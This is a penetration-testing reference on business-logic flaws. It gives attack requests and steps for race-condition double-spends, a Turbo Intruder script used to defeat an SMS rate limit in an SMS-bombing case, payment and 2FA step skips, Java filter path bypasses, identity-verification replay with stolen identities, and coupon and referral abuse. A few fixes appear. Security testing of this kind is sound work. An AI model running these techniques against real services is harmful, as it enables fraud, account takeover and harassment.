# business-logic-vulnerabilities technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 2. RACE CONDITIONS

**Concept**: Two operations run simultaneously before the first completes its check-update cycle.

### Double-Spend / Double-Redeem
```bash
# Send same request simultaneously (~millisecond apart):
# Use Burp Repeater "Send to Group" or Race Conditions tool:

POST /api/use-coupon    ← send 20 parallel requests
POST /api/redeem-gift   ← same coupon code, parallel
POST /api/withdraw-funds ← same balance, parallel

# If check and update are non-atomic:
# Thread 1: check(balance >= 100) → TRUE
# Thread 2: check(balance >= 100) → TRUE (before Thread 1 deducted)
# Thread 1: balance -= 100
# Thread 2: balance -= 100 → BOTH succeed → double-spend
```

### Race Condition Test with Burp Suite
```
1. Capture request
2. Send to Repeater → duplicate 20+ times
3. "Send group in parallel" (Burp 2023+)
4. Check: did any duplicate succeed?
```

### Turbo Intruder — Bypassing Per-Number SMS Rate Limit
Real case: when a normal request returns `"该号码短时间内申请发送短信次数过多，拒绝发送"`, sending the **same payload** with high concurrency through Turbo Intruder defeats the simple counter:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```
Result: the per-phone limiter races and many requests slip through, generating multiple distinct verification codes (a real SMS-bombing case). Root cause: counter increment is non-atomic vs. the read.

### Multi-Device Concurrent VIP Subscription
Real case: a service offers **first-month-only discount**. Open the pay sheet on multiple devices (A, B, C) before any payment finishes, then complete each in sequence. Server only checks "is new user?" at the **first** request, so all subsequent requests inherit the discount AND the VIP duration stacks.
```
Normal: 下单 → 支付 → 充值会员 → 第二次下单 → 服务端校验 "已是新人" → 拒绝
Bypass: 设备A: 进入支付页 (锁定优惠资格)
        设备B: 进入支付页 (并发锁定)
        设备A: 完成支付 → VIP +1月 (优惠价)
        设备B: 完成支付 → VIP +1月 (仍按优惠价)
```
Same trick works on "补差价升级会员" — concurrent top-ups duplicate the duration credit.

### Account Registration Race
```
Register with same email simultaneously → two accounts created → data isolation broken
Password reset token race → reuse same token twice
Email verification race → verify multiple email addresses
```

### Limit Bypass via Race
```
"Claim once" discounts, freebies, "first order" bonus:
→ Send 10 parallel POST /claim requests
→ Race window: all pass the "already claimed?" check before any write
```

---

## 3. WORKFLOW / STEP SKIP BYPASS

### Payment Flow Bypass
```
Normal flow:
  1. Add to cart
  2. Enter shipping info
  3. Enter payment (card/wallet)
  4. Click confirm → payment charged
  5. Order confirmed

Attack: Skip to step 5 directly
POST /api/orders/confirm {"cart_id": "1234", "payment_status": "paid"}
→ Does server trust client-sent payment_status?
```

### Multi-Step Verification Skip
```
Password reset flow:
  1. Enter email
  2. Receive token
  3. Enter token
  4. Set new password (requires valid token from step 3)

Attack: Try going to step 4 without completing step 3:
POST /reset/password {"email": "victim@x.com", "token": "invalid", "new_pass": "hacked"}
→ Does server check that token was properly validated?

Or: Try token from old/expired flow → still accepted?
```

### 2FA Bypass
```
Normal flow:
  1. Enter username + password → success
  2. Enter 2FA code → logged in

Attack: After step 1 success, go directly to /dashboard
→ Is session created before 2FA completes?
→ Does /dashboard require 2FA-complete check or just "authenticated" flag?
```

### Filter Path Truncation Bypass — `..//` and `;`

Real case from a Java Web class audit: a manually-implemented Servlet `Filter` checks login by inspecting the URI string. Two reliable bypasses:

```
Path-traversal truncation (../):
  Protected:   http://target/FilterDemo/index.jsp        → 302 to /login
  Bypass:      http://target/FilterDemo/../../index.jsp  → 200 (filter sees "../../", URL parser collapses)

Semicolon truncation (;):
  Protected:   http://target/admin/doLogin.action        → 302 to /login
  Bypass:      http://target/;/admin/doLogin.action      → 200
                              ^
                              Servlet container treats segment after ; as "path parameter",
                              filter that uses request.getRequestURI() sees "/;/admin/doLogin.action",
                              doesn't match its protected-prefix "/admin/", lets the request through,
                              but the dispatcher then routes to the real /admin/doLogin.action handler.
```

**Fix**: never use `request.getRequestURI()` for security checks; use `request.getServletPath()` which is the normalized servlet-mapped path:
```java
// Vulnerable
String uri = request.getRequestURI();   // /;/admin/doLogin.action
// Safe
String path = request.getServletPath(); // /admin/doLogin.action
```

When auditing Java code, grep for `request.getRequestURI()` paired with `Filter`/`startsWith`/`indexOf("/admin")` patterns — those are immediate red flags.

### Real-Name Verification Replay-To-Reset

Fraudulent path that deliberately fails real-name authentication to **reopen** the editing flow:
```
1. Submit real-name auth with intentionally wrong cardNumber
   → server returns "code:200, msg:success, ok:true" but flow shows "驳回 / 等待审核"
2. Because the server marks state as "rejected" but doesn't lock the user, the UI lets the
   account go back into the "edit identity" state
3. Now resubmit with another (possibly stolen) identity
   → real-name binding repeats indefinitely, defeating anti-addiction lock and enabling account resale
```
Defense: rejected real-name submissions must lock the account / require human review, not loop back to the editor.

### Shipping Without Payment
```
  1. Add item to cart
  2. Enter shipping address
  3. Select payment method (credit card)
  4. Apply promo code (100% discount or gift card)  
  5. Final amount: $0
  6. Order placed

Attack: Apply 100% discount code → no actual payment processed → item ships
```

---

## 4. COUPON AND REFERRAL ABUSE

### Coupon Stacking
```
Test: Can you apply multiple coupon codes?
Test: Does "SAVE20" + promo stack to >100%?
Test: Apply coupon, remove item, keep discount applied, add different item
```

### Referral Loop
```
1. Create Account_A
2. Register Account_B with Account_A's referral code → both get credit
3. Create Account_C with Account_B's referral code
4. Ad infinitum with throwaway emails
→ Infinite credit generation
```

### Coupon = Fixed Dollar Amount on Variable-Price Item
```
Coupon: -$5 off any order
Buy item worth $3, use -$5 coupon → net -$2 (credit balance)
```

---

